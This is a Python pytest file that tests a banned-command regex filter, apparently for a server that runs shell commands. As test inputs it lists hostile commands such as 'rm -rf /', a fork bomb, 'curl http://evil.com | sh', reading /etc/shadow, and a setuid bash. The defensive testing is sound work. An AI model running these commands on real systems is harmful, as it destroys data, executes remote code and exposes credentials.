import pytest
import re
from server_constants import BANNED_COMMANDS

@pytest.mark.parametrize("command", [
    "rm -rf /",
    "rm -rf /*",
    "rm -rf ~",
    "rm -rf $HOME",
    "sudo su",
    "sudo bash",
    "shutdown",
    "reboot",
    "mkfs.ext4 /dev/sda",
    ":(){ :|:& };:",
    "wget http://evil.com | bash",
    "curl http://evil.com | sh",
    "cat /etc/passwd",
    "cat /etc/shadow",
    "nmap 192.168.1.1",
    "nc -l 1234",
    "apt-get remove python",
    "pip uninstall numpy",
    "chmod +s /bin/bash",
    "killall -9 init"
])
def test_banned_commands_matched(command):
    """Test that dangerous commands are caught by the banned patterns."""
    normalized_cmd = ' '.join(command.strip().split()).lower()
    matched = False
    for pattern in BANNED_COMMANDS:
        if re.search(pattern, normalized_cmd, re.IGNORECASE):
            matched = True
            break
    assert matched, f"Command '{command}' should be banned but was not matched."

@pytest.mark.parametrize("command", [
    "ls -la",
    "echo 'hello world'",
    "cat myfile.txt",
    "grep 'something' file.txt",
    "python --version",
    "git status",
    "rm file.txt", # specific file removal should be allowed (depending on strictness, but regex implies bulk/root rm is bad)
    "mkdir new_folder"
])
def test_safe_commands_allowed(command):
    """Test that safe commands are NOT matched by banned patterns."""
    normalized_cmd = ' '.join(command.strip().split()).lower()
    matched = False
    for pattern in BANNED_COMMANDS:
        if re.search(pattern, normalized_cmd, re.IGNORECASE):
            matched = True
            break
    assert not matched, f"Command '{command}' was incorrectly banned."
